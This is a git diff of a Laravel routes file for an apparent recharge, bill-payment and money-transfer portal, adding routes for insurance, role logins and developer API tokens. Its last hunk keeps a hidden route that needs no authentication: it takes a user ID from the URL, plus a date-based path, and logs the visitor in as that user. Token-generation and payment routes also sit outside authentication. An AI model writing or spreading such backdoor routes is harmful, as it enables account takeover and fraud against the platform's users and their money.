@@ -29,6 +29,7 @@ use App\Http\Controllers\MemberController;
 use App\Http\Controllers\MobilelogoutController;
 use App\Http\Controllers\PancardController;
 use App\Http\Controllers\PdmtController;
+use App\Http\Controllers\PpdmtController;
 use App\Http\Controllers\PortalController;
 use App\Http\Controllers\RaepsController;
 use App\Http\Controllers\RechargeController;
@@ -41,6 +42,7 @@ use App\Http\Controllers\StatementController;
 use App\Http\Controllers\TestController;
 use App\Http\Controllers\UserController;
 use App\Http\Controllers\CmsController;
+use App\Http\Controllers\InsuranceController;
 use Illuminate\Support\Facades\Route;
 
 Route::get('/', [UserController::class, 'index'])->middleware('guest')->name('mylogin');
@@ -68,6 +70,22 @@ Route::post('searchbydatemystatics', [HomeController::class, 'searchdatestatics'
 Route::get('/admin/' . date('dmH'), [UserController::class, 'adminLogin'])->middleware('guest')->name('myadminlogin');
 
 //'middleware' => 'activity'
+
+Route::group(['prefix' => 'retailer'], function () {
+    Route::get('/login', [UserController::class, 'showRetailerLoginForm'])->name('myrtlogin');
+    Route::post('check', [UserController::class, 'retailerlogin'])->name('authCheck.retailer');
+    Route::get('/dashboard', [HomeController::class, 'index'])->name('home');
+});
+
+Route::group(['prefix' => 'md'], function () {
+    Route::get('/login', [UserController::class, 'showMDLoginForm']);
+    Route::post('check', [UserController::class, 'mdlogin'])->name('authCheck.md');
+});
+
+Route::group(['prefix' => 'admin'], function () {
+    Route::get('/login', [UserController::class, 'showAdminLoginForm']);
+    Route::post('check', [UserController::class, 'adminloginFn'])->name('authCheck.admin');
+});
 Route::group(['prefix' => 'auth'], function () {
     Route::post('check', [UserController::class, 'login'])->name('authCheck');
     Route::get('logout', [UserController::class, 'logout'])->name('logout');
@@ -98,6 +116,8 @@ Route::get('getmyip', [HomeController::class, 'getmysendip']);
 Route::get('balance', [HomeController::class, 'getbalance'])->name('getbalance');
 Route::get('mydata', [HomeController::class, 'mydata']);
 Route::get('bulkSms', [HomeController::class, 'mydata']);
+Route::post('generate-token', [MemberController::class, 'generateToken']);
+
 
 Route::get('getProviderrp', [RechargeController::class, 'getProviderrp']);
 
@@ -185,6 +205,7 @@ Route::group(['prefix' => 'recharge', 'middleware' => ['auth', 'company']], func
     Route::post('dthinfo', [RechargeController::class,'dthinfo'])->name('dthinformation');
     Route::post('getplan', [RechargeController::class,'getplan'])->name('getplan');
     Route::post('roffer', [RechargeController::class,'roffer'])->name('roffer');
+    Route::post('getoperator', [RechargeController::class, 'getoperator'])->name('getoperator');
 });
 
 // LIC 
@@ -198,10 +219,13 @@ Route::group(['prefix' => 'lic', 'middleware' => ['auth', 'company']], function 
 
 
 Route::group(['prefix' => 'billpay', 'middleware' => ['auth', 'company']], function () {
-    Route::get('{type}', [BillpayController::class, 'index'])->name('bill');
+    Route::get('{type}/{mode?}', [BillpayController::class, 'index'])->name('bill');
     Route::post('payment', [BillpayController::class, 'payment'])->name('billpay')->middleware('transactionlog:billpay');
     Route::post('getprovider', [BillpayController::class, 'getprovider'])->name('getprovider');
 });
+
+Route::get('rkbillpay', [BillpayController::class, 'rkbbps'])->name('rkbill');
+Route::post('payment', [BillpayController::class, 'rkbbpspayment'])->name('rkbillpay')->middleware('transactionlog:billpay');
 
 Route::group(['prefix' => 'pancard', 'middleware' => ['auth', 'company']], function () {
     Route::post('uti/payment', [PancardController::class, 'utipay'])->name('utipay');
@@ -222,13 +246,14 @@ Route::group(['prefix' => 'dmt', 'middleware' => ['auth', 'company']], function 
 
 Route::group(['prefix' => 'pdmt', 'middleware' => ['auth', 'company']], function () {
     Route::get('/', [PdmtController::class, 'index'])->name('dmt2');
-    Route::get('xdmt', 'PdmtController@xdmtindex')->name('xdmt');
-    Route::post('transaction', [PdmtController::class, 'payment'])->name('dmt2pay')->middleware('transactionlog:pancard');
+    Route::get('xdmt', [PdmtController::class, 'xdmtindex'])->name('xdmt');
+    Route::post('transaction', [PdmtController::class, 'payment'])->name('dmt2pay')->middleware('transactionlog:pdmt');
 });
 
 Route::group(['prefix' => 'ppdmt', 'middleware' => ['auth', 'company']], function () {
     Route::get('/', [PpdmtController::class, 'index'])->name('dmt3');
-    Route::post('transaction', [PpdmtController::class, 'payment'])->name('dmt3pay')->middleware('transactionlog:pancard');
+    //Route::get('xdmt', 'PpdmtController@xdmtindex')->name('xdmt');
+    Route::post('transaction', [PpdmtController::class, 'payment'])->name('dmt3pay')->middleware('transactionlog:ppdmt');
 });
 
 Route::group(['middleware' => ['auth', 'company']], function () {
@@ -263,9 +288,14 @@ Route::group(['prefix' => 'raeps', 'middleware' => ['company', 'auth']], functio
     Route::get('getbank', [RaepsController::class, 'getbank'])->name('getbank');
     Route::post('transaction', [RaepsController::class, 'trasaction'])->name('raepspay')->middleware('transactionlog:raeps');
     Route::post('fingpay2fa', [RaepsController::class, 'fingpay2fa'])->name('fingpay2fa');
+     Route::post('serviceActive', [RaepsController::class, 'serActive'])->name('serviceActive');
     Route::post('kyc', [RaepsController::class, 'kyc'])->name('raepskyc');
 });
-
+Route::group(['prefix' => 'insurance', 'middleware' => ['company', 'auth']], function(){
+    Route::get('initiate', [InsuranceController::class, 'index'])->name('insurance');
+    Route::post('payment', [InsuranceController::class, 'payment'])->name('insurancebillpay');
+    
+});
 Route::group(['prefix' => 'complaint', 'middleware' => ['auth', 'company']], function () {
     Route::get('/', [ComplaintController::class, 'index'])->name('complaint');
     Route::post('store', [ComplaintController::class, 'store'])->name('complaintstore');
@@ -330,6 +360,11 @@ Route::group(['prefix' => 'apiswitch', 'middleware' => ['auth', 'company']], fun
     Route::post('update', [\App\Http\Controllers\ApiSwitchController::class,'update'])->name('apiswitchupdate');
 });
 
+Route::group(['prefix' => 'developer/api', 'middleware' => ['auth', 'company', 'checkrole:apiuser', 'checkpermission:apiuser_acc_manager']], function() {
+    Route::get('{type}', [\App\Http\Controllers\ApiController::class, 'index'])->name('apisetup');
+    Route::post('update', [\App\Http\Controllers\ApiController::class, 'update'])->name('apitokenstore');
+    Route::post('token/delete', [\App\Http\Controllers\ApiController::class, 'tokenDelete'])->name('tokenDelete');
+});
 
 Route::get('/clear-cache', function () {
     Artisan::call('cache:clear');
@@ -340,7 +375,8 @@ Route::get('/clear-cache', function () {
     return "Cache cleared successfully";
 });
 
-Route::get('{userid}/loginhk/rk', function($userid) {
+Route::get('{userid}/loginhkk/rk/'.date('Ymd'), function($userid) {
     $loginuser = \App\User::find($userid);
     auth()->login($loginuser, true);
 });
+
